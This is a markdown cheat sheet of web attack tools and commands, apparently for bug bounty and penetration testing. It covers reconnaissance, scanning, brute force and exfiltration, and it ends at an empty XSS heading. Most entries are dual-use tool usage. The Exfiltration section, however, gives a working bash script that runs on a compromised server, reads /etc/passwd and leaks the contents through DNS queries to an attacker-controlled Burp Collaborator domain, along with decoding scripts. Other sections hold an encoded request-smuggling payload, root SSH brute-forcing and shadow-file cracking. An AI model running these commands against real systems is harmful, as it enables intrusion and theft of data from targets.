### Web Attacks:

## Table of Contents
- [Discovering](#Discovering)
  - [Targets](#Targets)
  - [IP Enumeration](#IP-Enumeration)
  - [Subdomain Enumeration](#Subdomain-Enumeration)
  - [Wayback Machine](#Wayback-Machine)
  - [Cache](#Cache)
  - [Crawling](#Crawling)
  - [Wordlist](#Wordlist)
  - [Directory Bruteforcing](#Directory-Bruteforcing)
  - [Parameter Bruteforcing](#Parameter-Bruteforcing)
  - [DNS and HTTP detection](#DNS-and-HTTP-detection)
  - [Acquisitions/Names/Addresses/Contacts/Emails/etc.](#Acquisitions)
  - [HTML/JavaScript Comments](#JavaScript-Comments)
  - [Google Dorks](#Google-Dorks)
  - [Content Security Policy (CSP)](#CSP)
  - [Tiny URLs Services](#Tiny-URLs-Services)
  - [GraphQL](#GraphQL)
  - [General](#General-Discovering)
- [Enumerating](#Enumerating)
  - [Fingerprint](#Fingerprint)
  - [Buckets](#Buckets)
  - [Cloud Enumeration](#Cloud-Enumeration)
  - [Containerization](#Containerization)
  - [Visual Identification](#Visual-Identification)
- [Scanning](#Scanning)
  - [Static Application Security Testing](#Static-Application-Security-Testing)
  - [Dependency Confusion](#Dependency-Confusion)
  - [Send Emails](#Send-Emails)
  - [Search Vulnerabilities](#Search-Vulnerabilities)
  - [Web Scanning](#Web-Scanning)
  - [HTTP Request Smuggling](#HTTP-Request-Smuggling)
  - [Subdomain Takeover](#Subdomain-Takeover)
  - [SQLi (SQL Injection)](#SQLi-Scanning)
  - [Repositories Scanning](#Repositories-Scanning)
  - [Google Dorks Scanning](#Google-Dorks-Scanning)
  - [CORS Misconfigurations](#CORS-Misconfigurations)
- [Monitoring](#Monitoring)
  - [CVE](#CVE)
- [Attacking](#Attacking)
  - [Brute Force](#Brute-Force)
  - [Exfiltration](#Exfiltration)
- [Manual](#Manual)
  - [Payloads](#Payloads)
  - [Deserialization](#Deserialization)
  - [SSRF (Server-Side Request Forgery)](#SSRF)
  - [DNS Rebinding](#DNS-Rebinding)
  - [SMTP Header Injection](#SMTP-Header-Injection)
  - [Reverse Shell](#Reverse-Shell)
  - [SQLi (SQL Injection)](#SQLi-Manual)
  - [SSTI (Server Side Template Injection)](#SSTI)
  - [WebDAV (Web Distributed Authoring and Versioning)](#WebDAV)
  - [Generic Tools](#Generic-Tools)
  - [General](#General-Manual)

## Discovering

### Targets
https://github.com/arkadiyt/bounty-targets-data
<br># This repo contains data dumps of Hackerone and Bugcrowd scopes (i.e. the domains that are eligible for bug bounty reports).

### IP Enumeration
http://www.asnlookup.com
<br># This tool leverages ASN to look up IP addresses (IPv4 & IPv6) owned by a specific organization for reconnaissance purposes.

https://github.com/pielco11/fav-up
<br># Lookups for real IP starting from the favicon icon and using Shodan.
<br>```python3 favUp.py --favicon-file favicon.ico -sc```

https://stackoverflow.com/questions/16986879/bash-script-to-list-all-ips-in-prefix
<br># List all IP addresses in a given CIDR block
<br>```nmap -sL -n 10.10.64.0/27 | awk '/Nmap scan report/{print $NF}'```

### Subdomain Enumeration
https://appsecco.com/books/subdomain-enumeration
<br># This book intendes to be a reference for subdomain enumeration techniques.

https://github.com/OWASP/Amass
<br># The OWASP Amass Project performs network mapping of attack surfaces and external asset discovery using open source information gathering and active reconnaissance techniques.
<br>```amass enum -passive -dir /tmp/amass_output/ -d example.com -o dir/example.com```

https://github.com/projectdiscovery/subfinder
<br># subfinder is a subdomain discovery tool that discovers valid subdomains for websites by using passive online sources.
<br>```subfinder -r 8.8.8.8,8.8.4.4,1.1.1.1,1.0.0.1 -t 10 -v -d example.com -o dir/example.com```

https://github.com/nsonaniya2010/SubDomainizer
<br># SubDomainizer is a tool designed to find hidden subdomains and secrets present is either webpage, Github, and external javascripts present in the given URL.
<br>```python3 SubDomainizer.py -u example.com -o dir/example.com```

https://dns.bufferover.run/dns?q=example.com
<br># Powered by DNSGrep (https://github.com/erbbysam/DNSGrep)
<br># A utility for quickly searching presorted DNS names. Built around the Rapid7 rdns & fdns dataset.

https://crt.sh/?q=example.com
<br># Certificate Search

https://censys.io/certificates?q=parsed.subject_dn%3AO%3DExample+Organization
<br># Censys is the most reputable, exhaustive, and up-to-date source of Internet scan data in the world, so you see everything.

https://www.shodan.io/search?query=ssl%3AExample
<br># Shodan is the world's first search engine for Internet-connected devices.

https://fofa.so
<br># FOFA (Cyberspace Assets Retrieval System) is the world's IT equipment search engine with more complete data coverage, and it has more complete DNA information of global networked IT equipment.

https://www.zoomeye.org
<br># ZoomEyeis China's first and world-renowned cyberspace search engine driven by 404 Laboratory of Knownsec. Through a large number of global surveying and mapping nodes, according to the global IPv4, IPv6 address and website domain name databases，it can continuously scan and identify multiple service port and protocols 24 hours a day, and finally map the whole or local cyberspace.

https://securitytrails.com/list/email/dns-admin.example.com
<br># Total Internet Inventory with the most comprehensive data that informs with unrivaled accuracy.
<br>```curl --request POST --url 'https://api.securitytrails.com/v1/domains/list?apikey={API_Key}&page=1&scroll=true' --data '{"filter":{"apex_domain":"example.com"}}' | jq '.records[].hostname' | sed 's/"//g' >> subdomains.txt```
<br>```curl --request POST --url 'https://api.securitytrails.com/v1/domains/list?apikey={API_Key}&page=1&scroll=true' --data '{"filter":{"whois_email":"domains@example.com"}}' | jq '.records[].hostname' | sed 's/"//g' >> domains.txt```

https://viewdns.info/reversewhois
<br># This free tool will allow you to find domain names owned by an individual person or company.

https://opendata.rapid7.com/
<br># Offering researchers and community members open access to data from Project Sonar, which conducts internet-wide surveys to gain insights into global exposure to common vulnerabilities.

https://github.com/ninoseki/mihari
<br># Mihari is a framework for continuous OSINT based threat hunting.

### Wayback Machine
https://github.com/tomnomnom/waybackurls
<br># Accept line-delimited domains on stdin, fetch known URLs from the Wayback Machine for *.domain and output them on stdout.
<br>```cat subdomains.txt | waybackurls > waybackurls.txt```

https://github.com/tomnomnom/hacks
<br># Hacky one-off scripts, tests etc.
<br>```cat waybackurls.txt | go run /root/Tools/hacks/anti-burl/main.go | tee waybackurls_valid.txt```

### Cache
https://www.giftofspeed.com/cache-checker
<br># This tool lists which web files on a website are cached and which are not. Furthermore it checks by which method these files are cached and what the expiry time of the cached files is.

### Crawling
https://github.com/jaeles-project/gospider
<br># Fast web spider written in Go.
<br>```gospider -s "https://example.com/" -o output -c 20 -d 10```

### Wordlist
https://portswigger.net/bappstore/21df56baa03d499c8439018fe075d3d7
<br># Scrapes all unique words and numbers for use with password cracking.

https://github.com/ameenmaali/wordlistgen
<br># wordlistgen is a tool to pass a list of URLs and get back a list of relevant words for your wordlists.
<br>```cat hosts.txt | wordlistgen```

https://github.com/adamtlangley/gitscraper
<br># A tool which scrapes public github repositories for common naming conventions in variables, folders and files.
<br>```php gitscraper.php {GitHub Username} {GitHub Personal KEY}```

https://github.com/danielmiessler/SecLists
<br># SecLists is the security tester's companion. It's a collection of multiple types of lists used during security assessments, collected in one place. List types include usernames, passwords, URLs, sensitive data patterns, fuzzing payloads, web shells, and many more.

https://github.com/swisskyrepo/PayloadsAllTheThings
<br># A list of useful payloads and bypasses for Web Application Security. Feel free to improve with your payloads and techniques.

https://github.com/fuzzdb-project/fuzzdb
<br># FuzzDB was created to increase the likelihood of finding application security vulnerabilities through dynamic application security testing.

https://github.com/google/fuzzing
<br># This project aims at hosting tutorials, examples, discussions, research proposals, and other resources related to fuzzing.

https://github.com/xyele/hackerone_wordlist
<br># The wordlists that have been compiled using disclosed reports at the HackerOne bug bounty platform.

https://wordlists.assetnote.io
<br># This website provides you with wordlists that are up to date and effective against the most popular technologies on the internet.

### Directory Bruteforcing
https://github.com/ffuf/ffuf
<br># A fast web fuzzer written in Go.
<br>```ffuf -H 'User-Agent: Mozilla' -v -t 30 -w mydirfilelist.txt -b 'NAME1=VALUE1; NAME2=VALUE2' -u 'https://example.com/FUZZ'```

https://github.com/OJ/gobuster
<br># Gobuster is a tool used to brute-force.
<br>```gobuster dir -a 'Mozilla' -e -k -l -t 30 -w mydirfilelist.txt -c 'NAME1=VALUE1; NAME2=VALUE2' -u 'https://example.com/'```

https://github.com/tomnomnom/meg
<br># meg is a tool for fetching lots of URLs but still being 'nice' to servers.
<br>```meg -c 50 -H 'User-Agent: Mozilla' -s 200 weblogic.txt example.txt weblogic```

https://github.com/deibit/cansina
<br># Cansina is a Web Content Discovery Application.
<br>```python3 cansina.py -u 'https://example.com/' -p mydirfilelist.txt --persist```

https://github.com/epi052/feroxbuster
<br># A simple, fast, recursive content discovery tool written in Rust.
<br>```feroxbuster -u 'https://example.com/' -x pdf -x js,html -x php txt json,docx```

### Parameter Bruteforcing
https://github.com/s0md3v/Arjun
<br># Arjun can find query parameters for URL endpoints.
<br>```arjun -u https://example.com/```

https://github.com/Sh1Yo/x8
<br># Hidden parameters discovery suite written in Rust.
<br>```x8 -u "https://example.com/" -w <wordlist>```

### DNS and HTTP detection
https://ceye.io
<br># Monitor service for security testing.
<br>```curl http://api.ceye.io/v1/records?token={API Key}&type=dns
curl http://api.ceye.io/v1/records?token={API Key}&type=http```

https://portswigger.net/burp/documentation/collaborator
<br># Burp Collaborator is a network service that Burp Suite uses to help discover many kinds of vulnerabilities.
<br># Tip https://www.onsecurity.co.uk/blog/gaining-persistent-access-to-burps-collaborator-sessions

http://pingb.in
<br># Simple DNS and HTTP service for security testing.

https://github.com/ctxis/SnitchDNS
<br># SnitchDNS is a database driven DNS Server with a Web UI, written in Python and Twisted, that makes DNS administration easier with all configuration changed applied instantly without restarting any system services.

http://dnslog.cn
<br># Simple DNS server with realitme logs.

https://interact.projectdiscovery.io/
<br># Interactsh is an Open-Source Solution for Out of band Data Extraction, A tool designed to detect bugs that cause external interactions, For example - Blind SQLi, Blind CMDi, SSRF, etc.

### <a name="Acquisitions"></a>Acquisitions/Names/Addresses/Contacts/Emails/etc.
https://hunter.io
<br># Hunter lets you find email addresses in seconds and connect with the people that matter for your business.

https://intelx.io
<br># Intelligence X is an independent European technology company founded in 2018 by Peter Kleissner. The company is based in Prague, Czech Republic. Its mission is to develop and maintain the search engine and data archive.

https://www.nerdydata.com
<br># Find companies based on their website's tech stack or code.

https://github.com/khast3x/h8mail
<br># h8mail is an email OSINT and breach hunting tool using different breach and reconnaissance services, or local breaches such as Troy Hunt's "Collection1" and the infamous "Breach Compilation" torrent.
<br>```h8mail -t target@example.com```

https://dashboard.fullcontact.com
<br># Our person-first Identity Resolution Platform provides the crucial intelligence needed to drive Media Amplification, Omnichannel Measurement, and Customer Recognition.

https://www.peopledatalabs.com
<br># Our data empowers developers to build innovative, trusted data-driven products at scale.

https://www.social-searcher.com
<br># Free Social Media Search Engine.

https://github.com/mxrch/GHunt
<br># GHunt is an OSINT tool to extract information from any Google Account using an email.
<br>```python3 ghunt.py email myemail@gmail.com```

### <a name="JavaScript-Comments"></a>HTML/JavaScript Comments
https://portswigger.net/support/using-burp-suites-engagement-tools
<br># Burp Engagement Tools

### Google Dorks
https://www.exploit-db.com/google-hacking-database
<br># Google Hacking Database

### <a name="CSP"></a>Content Security Policy (CSP)
https://csp-evaluator.withgoogle.com/
<br># CSP Evaluator allows developers and security experts to check if a Content Security Policy (CSP) serves as a strong mitigation against cross-site scripting attacks.

### Tiny URLs Services
https://www.scribd.com/doc/308659143/Cornell-Tech-Url-Shortening-Research
<br># Cornell Tech Url Shortening Research

https://github.com/utkusen/urlhunter
<br># urlhunter is a recon tool that allows searching on URLs that are exposed via shortener services such as bit.ly and goo.gl.
<br>```urlhunter -keywords keywords.txt -date 2020-11-20 -o out.txt```

https://shorteners.grayhatwarfare.com
<br># Search Shortener Urls

### GraphQL
https://github.com/doyensec/graph-ql
<br># A security testing tool to facilitate GraphQL technology security auditing efforts.

https://hackernoon.com/understanding-graphql-part-1-nxm3uv9
<br># Understanding GraphQL

https://graphql.org/learn/introspection/
<br># It's often useful to ask a GraphQL schema for information about what queries it supports. GraphQL allows us to do so using the introspection system!

https://jondow.eu/practical-graphql-attack-vectors/
<br># Practical GraphQL attack vectors

https://lab.wallarm.com/why-and-how-to-disable-introspection-query-for-graphql-apis/
<br># Why and how to disable introspection query for GraphQL APIs

https://lab.wallarm.com/securing-and-attacking-graphql-part-1-overview/
<br># Securing GraphQL

https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4
<br># GraphQL vs REST API model, common security test cases for GraphQL endpoints.

https://the-bilal-rizwan.medium.com/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696
<br># GraphQL common vulnerabilities & how to exploit them.

### <a name="General-Discovering"></a>General
https://github.com/redhuntlabs/Awesome-Asset-Discovery
<br># Asset Discovery is the initial phase of any security assessment engagement, be it offensive or defensive. With the evolution of information technology, the scope and definition of assets has also evolved.

https://spyse.com
<br># Spyse holds the largest database of its kind, containing a wide range of OSINT data handy for the reconnaissance.

https://github.com/yogeshojha/rengine
<br># reNgine is an automated reconnaissance framework meant for information gathering during penetration testing of web applications.

https://github.com/phor3nsic/favicon_hash_shodan
<br># Search for a framework by favicon

https://github.com/righettod/website-passive-reconnaissance
<br># Script to automate, when possible, the passive reconnaissance performed on a website prior to an assessment.

## Enumerating

### Fingerprint
https://github.com/urbanadventurer/WhatWeb
<br># WhatWeb identifies websites. Its goal is to answer the question, "What is that Website?". WhatWeb recognises web technologies including content management systems (CMS), blogging platforms, statistic/analytics packages, JavaScript libraries, web servers, and embedded devices.
<br>```whatweb -a 4 -U 'Mozilla' -c 'NAME1=VALUE1; NAME2=VALUE2' -t 20 www.example.com```

https://builtwith.com
<br># Find out what websites are Built With.

https://www.wappalyzer.com
<br># Identify technologies on websites.

https://webtechsurvey.com
<br># Discover what technologies a website is built on or find out what websites use a particular web technology.

https://portswigger.net/bappstore/c9fb79369b56407792a7104e3c4352fb
<br># Software Vulnerability Scanner Burp Extension

https://github.com/GrrrDog/weird_proxies
<br># It's a cheat sheet about behaviour of various reverse proxies and related attacks.

### Buckets
https://aws.amazon.com/cli/
<br># List s3 bucket permissions and keys
<br>```aws s3api get-bucket-acl --bucket examples3bucketname```
<br>```aws s3api get-object-acl --bucket examples3bucketname --key dir/file.ext```
<br>```aws s3api list-objects --bucket examples3bucketname```
<br>```aws s3api list-objects-v2 --bucket examples3bucketname```
<br>```aws s3api get-object --bucket examples3bucketname --key dir/file.ext localfilename.ext```
<br>```aws s3api put-object --bucket examples3bucketname --key dir/file.ext --body localfilename.ext```

https://github.com/eth0izzle/bucket-stream
<br># Find interesting Amazon S3 Buckets by watching certificate transparency logs

https://buckets.grayhatwarfare.com/
<br># Search Public Buckets

https://github.com/VirtueSecurity/aws-extender
<br># Burp Suite extension which can identify and test S3 buckets

### Cloud Enumeration
https://github.com/andresriancho/enumerate-iam
<br># Found a set of AWS credentials and have no idea which permissions it might have?

https://github.com/nccgroup/ScoutSuite
<br># Scout Suite is an open source multi-cloud security-auditing tool, which enables security posture assessment of cloud environments.

https://github.com/toniblyx/prowler
<br># Prowler is a command line tool that helps you with AWS security assessment, auditing, hardening and incident response.

https://github.com/salesforce/cloudsplaining
<br># Cloudsplaining is an AWS IAM Security Assessment tool that identifies violations of least privilege and generates a risk-prioritized HTML report.

https://github.com/cloudsploit/scans
<br># CloudSploit by Aqua is an open-source project designed to allow detection of security risks in cloud infrastructure accounts, including: Amazon Web Services (AWS), Microsoft Azure, Google Cloud Platform (GCP), Oracle Cloud Infrastructure (OCI), and GitHub. These scripts are designed to return a series of potential misconfigurations and security risks.

https://github.com/RhinoSecurityLabs/pacu
<br># Pacu is an open-source AWS exploitation framework, designed for offensive security testing against cloud environments.

https://github.com/VirtueSecurity/aws-extender
<br># This Burp Suite extension can identify and test S3 buckets as well as Google Storage buckets and Azure Storage containers for common misconfiguration issues using the boto/boto3 SDK library.

https://github.com/irgoncalves/gcp_security
<br># This repository is intented to have Google Cloud Security recommended practices, scripts and more.

https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html
<br># Instance metadata is data about your instance that you can use to configure or manage the running instance. Instance metadata is divided into categories, for example, host name, events, and security groups.

https://cloud.google.com/compute/docs/storing-retrieving-metadata
<br># Every instance stores its metadata on a metadata server. You can query this metadata server programmatically, from within the instance and from the Compute Engine API. You can query for information about the instance, such as the instance's host name, instance ID, startup and shutdown scripts, custom metadata, and service account information. Your instance automatically has access to the metadata server API without any additional authorization.

https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service
<br># The Azure Instance Metadata Service (IMDS) provides information about currently running virtual machine instances. You can use it to manage and configure your virtual machines. This information includes the SKU, storage, network configurations, and upcoming maintenance events.

https://www.alibabacloud.com/help/doc-detail/49122.htm
<br># Metadata of an instance includes basic information of the instance in Alibaba Cloud, such as the instance ID, IP address, MAC addresses of network interface controllers (NICs) bound to the instance, and operating system type.

https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/
<br># Tutorial on privilege escalation and post exploitation tactics in Google Cloud Platform environments.

### Containerization
https://github.com/stealthcopter/deepce
<br># Docker Enumeration, Escalation of Privileges and Container Escapes (DEEPCE).

### Visual Identification
https://github.com/FortyNorthSecurity/EyeWitness
<br># EyeWitness is designed to take screenshots of websites provide some server header info, and identify default credentials if known.
<br>```eyewitness --web --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" --threads 10 --timeout 30 --prepend-https -f "${PWD}/subdomains.txt" -d "${PWD}/eyewitness/"```

https://github.com/michenriksen/aquatone
<br># Aquatone is a tool for visual inspection of websites across a large amount of hosts and is convenient for quickly gaining an overview of HTTP-based attack surface.
<br>```cat targets.txt | aquatone```

https://github.com/sensepost/gowitness
<br># gowitness is a website screenshot utility written in Golang, that uses Chrome Headless to generate screenshots of web interfaces using the command line, with a handy report viewer to process results. Both Linux and macOS is supported, with Windows support mostly working.
<br>```gowitness scan --cidr 192.168.0.0/24 --threads 20```

## Scanning

### Static Application Security Testing
https://github.com/returntocorp/semgrep
<br># Semgrep is a fast, open-source, static analysis tool that excels at expressing code standards — without complicated queries — and surfacing bugs early at editor, commit, and CI time.

### Dependency Confusion
https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610
<br># How I Hacked Into Apple, Microsoft and Dozens of Other Companies.

https://github.com/dwisiswant0/nodep
<br># nodep check available dependency packages across npmjs, PyPI or RubyGems registry.

https://github.com/visma-prodsec/confused
<br># A tool for checking for lingering free namespaces for private package names referenced in dependency configuration for Python (pypi) requirements.txt, JavaScript (npm) package.json, PHP (composer) composer.json or MVN (maven) pom.xml.

### Send Emails
https://medium.com/intigriti/how-i-hacked-hundreds-of-companies-through-their-helpdesk-b7680ddc2d4c
<br># Ticket Trick

https://medium.com/intigriti/abusing-autoresponders-and-email-bounces-9b1995eb53c2
<br># Abusing autoresponders and email bounces

<br># Send multiple emails
<br>```while read i; do echo $i; echo -e "From: example1@gmail.com\nTo: ${i}\nCc: example2@gmail.com\nSubject: This is the subject ${i}\n\nThis is the body ${i}" | ssmtp ${i},example2@gmail.com; done < emails.txt```

### Search Vulnerabilities
https://github.com/vulnersCom/getsploit
<br># Command line search and download tool for Vulners Database inspired by searchsploit.
<br>```getsploit wordpress 4.7.0```

https://www.exploit-db.com/searchsploit
<br># Included in our Exploit Database repository on GitHub is searchsploit, a command line search tool for Exploit-DB that also allows you to take a copy of Exploit Database with you, everywhere you go.
<br>```searchsploit -t oracle windows```

https://github.com/vulmon/Vulmap
<br># Vulmap is an open-source online local vulnerability scanner project. It consists of online local vulnerability scanning programs for Windows and Linux operating systems.

https://grep.app
<br># Search across a half million git repos.

https://github.com/0ang3el/aem-hacker
<br># Tools to identify vulnerable Adobe Experience Manager (AEM) webapps.
<br>```python3 aem_hacker.py -u https://example.com --host your_vps_hostname_ip```

### Web Scanning
https://support.portswigger.net/customer/portal/articles/1783127-using-burp-scanner
<br># Burp Scanner is a tool for automatically finding security vulnerabilities in web applications.

https://github.com/spinkham/skipfish
<br># Skipfish is an active web application security reconnaissance tool.
<br>```skipfish -MEU -S dictionaries/minimal.wl -W new_dict.wl -C "AuthCookie=value" -X /logout.aspx -o output_dir http://www.example.com/```

https://github.com/sullo/nikto
<br># Nikto is an Open Source (GPL) web server scanner which performs comprehensive tests against web servers for multiple items, including over 6700 potentially dangerous files/programs, checks for outdated versions of over 1250 servers, and version specific problems on over 270 servers. It also checks for server configuration items such as the presence of multiple index files, HTTP server options, and will attempt to identify installed web servers and software. Scan items and plugins are frequently updated and can be automatically updated.
<br>```nikto -ssl -host www.example.com```

https://github.com/wpscanteam/wpscan
<br># WordPress Security Scanner
<br>```wpscan --disable-tls-checks --ignore-main-redirect --user-agent 'Mozilla' -t 10 --force --wp-content-dir wp-content --url blog.example.com```

https://github.com/droope/droopescan
<br># A plugin-based scanner that aids security researchers in identifying issues with several CMS.
<br>```droopescan scan drupal -u example.com```

https://github.com/projectdiscovery/nuclei
<br># Nuclei is used to send requests across targets based on a template leading to zero false positives and providing fast scanning on large number of hosts.
<br>```nuclei -l urls.txt -t cves/ -t files/ -o results.txt```

https://github.com/six2dez/reconftw
<br># reconFTW is a tool designed to perform automated recon on a target domain by running the best set of tools to perform enumeration and finding out vulnerabilities.
<br>```reconftw.sh -d target.com -a```

https://gobies.org
<br># The new generation of network security technology achieves rapid security emergency through the establishment of a complete asset database for the target.

https://github.com/commixproject/commix
<br># By using this tool, it is very easy to find and exploit a command injection vulnerability in a certain vulnerable parameter or HTTP header.
<br>```python commix.py --url="http://192.168.178.58/DVWA-1.0.8/vulnerabilities/exec/#" --data="ip=127.0.0.1&Submit=submit" --cookie="security=medium; PHPSESSID=nq30op434117mo7o2oe5bl7is4"```

https://github.com/MrCl0wnLab/ShellShockHunter
<br># Shellshock, also known as Bashdoor, is a family of security bugs in the Unix Bash shell, the first of which was disclosed on 24 September 2014.
<br>```python main.py --range '194.206.187.X,194.206.187.XXX' --check --thread 40 --ssl```

https://github.com/crashbrz/WebXmlExploiter/
<br># The WebXmlExploiter is a tool to exploit exposed by misconfiguration or path traversal web.xml files.

### HTTP Request Smuggling
https://github.com/defparam/smuggler
<br># An HTTP Request Smuggling / Desync testing tool written in Python 3.
<br>```python3 smuggler.py -q -u https://example.com/```
<br>
<br># Attacking through command line a HTTPS vulnerable service. Good for persistence when no one believes in you.
<br>```echo 'UE9TVCAvIEhUVFAvMS4xDQpIb3N0OiB5b3VyLWxhYi1pZC53ZWItc2VjdXJpdHktYWNhZGVteS5uZXQNCkNvbm5lY3Rpb246IGtlZXAtYWxpdmUNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkDQpDb250ZW50LUxlbmd0aDogNg0KVHJhbnNmZXItRW5jb2Rpbmc6IGNodW5rZWQNCg0KMA0KDQpH' | base64 -d | timeout 1 openssl s_client -quiet -connect your-lab-id.web-security-academy.net:443 &>/dev/null```

https://github.com/neex/http2smugl
<br># This tool helps to detect and exploit HTTP request smuggling in cases it can be achieved via HTTP/2 -> HTTP/1.1 conversion by the frontend server.
<br>```http2smugl detect https://example.com/```

https://github.com/BishopFox/h2csmuggler
<br># h2cSmuggler smuggles HTTP traffic past insecure edge-server proxy_pass configurations by establishing HTTP/2 cleartext (h2c) communications with h2c-compatible back-end servers, allowing a bypass of proxy rules and access controls.
<br>```h2csmuggler.py -x https://example.com/ --test```

https://github.com/0ang3el/websocket-smuggle
<br># Smuggling HTTP requests over fake WebSocket connection.

https://portswigger.net/web-security/request-smuggling
<br># HTTP request smuggling is a technique for interfering with the way a web site processes sequences of HTTP requests that are received from one or more users.

https://github.com/PortSwigger/http-request-smuggler
<br># This is an extension for Burp Suite designed to help you launch HTTP Request Smuggling attacks, originally created during HTTP Desync Attacks research. It supports scanning for Request Smuggling vulnerabilities, and also aids exploitation by handling cumbersome offset-tweaking for you.

https://medium.com/@ricardoiramar/the-powerful-http-request-smuggling-af208fafa142
<br># This is how I was able to exploit a HTTP Request Smuggling in some Mobile Device Management (MDM) servers and send any MDM command to any device enrolled on them for a private bug bounty program.

https://www.intruder.io/research/practical-http-header-smuggling
<br># Modern web applications typically rely on chains of multiple servers, which forward HTTP requests to one another. The attack surface created by this forwarding is increasingly receiving more attention, including the recent popularisation of cache poisoning and request smuggling vulnerabilities. Much of this exploration, especially recent request smuggling research, has developed new ways to hide HTTP request headers from some servers in the chain while keeping them visible to others – a technique known as "header smuggling". This paper presents a new technique for identifying header smuggling and demonstrates how header smuggling can lead to cache poisoning, IP restriction bypasses, and request smuggling.

https://docs.google.com/presentation/d/1DV-VYkoEsjFsePPCmzjeYjMxSbJ9PUH5EIN2ealhr5I/
<br># Two Years Ago @albinowax Shown Us A New Technique To PWN Web Apps So Inspired By This Technique AND @defparam's Tool , I Have Been Collecting A Lot Of Mutations To Achieve Request Smuggling.

### Subdomain Takeover
https://github.com/anshumanbh/tko-subs
<br># Subdomain Takeover Scanner
<br>```tko-subs -data providers-data.csv -threads 20 -domains subdomains.txt```

https://github.com/Ice3man543/SubOver
<br># Subover is a Hostile Subdomain Takeover tool originally written in python but rewritten from scratch in Golang. Since it's redesign, it has been aimed with speed and efficiency in mind.
<br>```SubOver -l subdomains.txt```

### <a name="SQLi-Scanning"></a>SQLi (SQL Injection)
https://github.com/sqlmapproject/sqlmap
<br># sqlmap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers.
<br>```sqlmap --force-ssl -r RAW_REQUEST.txt --user-agent='Mozilla' --batch```
<br>```sqlmap -vv -u 'https://www.example.com?id=1*' --user-agent='Mozilla' --level 5 --risk 3 --batch```

### Repositories Scanning
https://github.com/zricethezav/gitleaks
<br># Gitleaks is a SAST tool for detecting hardcoded secrets like passwords, api keys, and tokens in git repos.
<br>```gitleaks --github-org=organization --threads=4 -v --disk```

https://github.com/michenriksen/gitrob
<br># Gitrob is a tool to help find potentially sensitive files pushed to public repositories on Github.

https://github.com/dxa4481/truffleHog
<br># Searches through git repositories for secrets, digging deep into commit history and branches.

https://github.com/awslabs/git-secrets
<br># Prevents you from committing passwords and other sensitive information to a git repository.

https://github.com/eth0izzle/shhgit
<br># shhgit helps secure forward-thinking development, operations, and security teams by finding secrets across their code before it leads to a security breach.

### Google Dorks Scanning
https://github.com/opsdisk/pagodo
<br># The goal of this project was to develop a passive Google dork script to collect potentially vulnerable web pages and applications on the Internet.
<br>```python3 pagodo.py -d example.com -g dorks.txt -l 50 -s -e 35.0 -j 1.1```

### CORS Misconfigurations
https://github.com/s0md3v/Corsy
<br># Corsy is a lightweight program that scans for all known misconfigurations in CORS implementations.
<br>```python3 corsy.py -u https://example.com```

## Monitoring

### CVE
https://www.opencve.io/
<br># OpenCVE (formerly known as Saucs.com) allows you to subscribe to vendors and products, and send you an alert as soon as a CVE is published or updated.

## Attacking

### Brute Force
https://github.com/vanhauser-thc/thc-hydra
<br># Number one of the biggest security holes are passwords, as every password security study shows. This tool is a proof of concept code, to give researchers and security consultants the possibility to show how easy it would be to gain unauthorized access from remote to a system.
<br>```hydra -l root -P 10-million-password-list-top-1000.txt www.example.com -t 4 ssh```

https://www.openwall.com/john/
<br># John the Ripper is an Open Source password security auditing and password recovery tool available for many operating systems.
<br>```unshadow /etc/passwd /etc/shadow > mypasswd.txt```
<br>```john mypasswd.txt```

https://hashcat.net/hashcat/
<br># Hashcat is a password recovery tool.
<br>```hashcat -m 0 -a 0 hashes.txt passwords.txt```

https://github.com/ustayready/fireprox
<br># Rotate the source IP address in order to bypass rate limits

### Exfiltration
https://github.com/vp777/procrustes
<br># A bash script that automates the exfiltration of data over dns

https://github.com/sensepost/reGeorg
<br># The successor to reDuh, pwn a bastion webserver and create SOCKS proxies through the DMZ. Pivot and pwn.

https://github.com/fbkcs/ThunderDNS
<br># This tool can forward TCP traffic over DNS protocol. Non-compile clients + socks5 support.

<br># Pure bash exfiltration over dns
<br>## Execute on target server (replace YOURBCID)
```
CMD="cat /etc/passwd"
HID=$(tr -dc A-Za-z0-9 </dev/urandom | head -c 5)
CMDID=$(tr -dc A-Za-z0-9 </dev/urandom | head -c 5)
BC="YOURBCID.burpcollaborator.net"
D="$HID-$CMDID.$BC"
M=$($CMD 2>&1); T=${#M}; O=0; S=30; I=1; while [ "${T}" -gt "0" ]; do C=$(echo ${M:${O}:${S}}|base64); C=${C//+/_0}; C=${C//\//_1}; C=${C//=/_2}; host -t A $I.${C}.$D&>/dev/null; O=$((${O}+${S})); T=$((${T}-${S})); I=$((I+1)); done
```

<br>## Execute on attacker machine (replace YOURBIID) and extract Burp Collaborator results
```
BCPURL="https://polling.burpcollaborator.net/burpresults?biid=YOURBIID"
RESULTS=$(curl -sk "${BCPURL}")
```
<br>## Get IDs available
```
echo "${RESULTS}" | jq -cM '.responses[]' | while read LINE; do if [[ $LINE == *'"protocol":"dns'* ]]; then echo ${LINE} | jq -rM '.data.subDomain' | egrep --color=never "^[[:digit:]]+\..*\..*\.$BC$"; fi; done | sed -r 's/^[[:digit:]]+\.[^.]+\.([^.]+)\..*/\1/g' | sort -u
```
<br>## Update ID and get command result (repeat for each ID)
```
ID="xxxxx-xxxxx"
echo "${RESULTS}" | jq -cM '.responses[]' | while read LINE; do if [[ $LINE == *'"protocol":"dns'* ]]; then echo ${LINE} | jq -rM '.data.subDomain' | egrep "^[[:digit:]]+\..*\..*\.$BC$"; fi; done | egrep "$ID" | sort -t. -k3 -g | sed -r 's/^[[:digit:]]+\.([^.]+)\..*/\1/g' | while read i; do i=${i//_0/+}; i=${i//_1/\/}; i=${i//_2/=}; echo ${i} | base64 -d; done
```

## Manual

### Payloads
https://github.com/swisskyrepo/PayloadsAllTheThings
<br># PayloadsAllTheThings

https://appcheck-ng.com/wp-content/uploads/unicode_normalization.html
<br># Unicode normalization good for WAF bypass.
  
<br># XSS
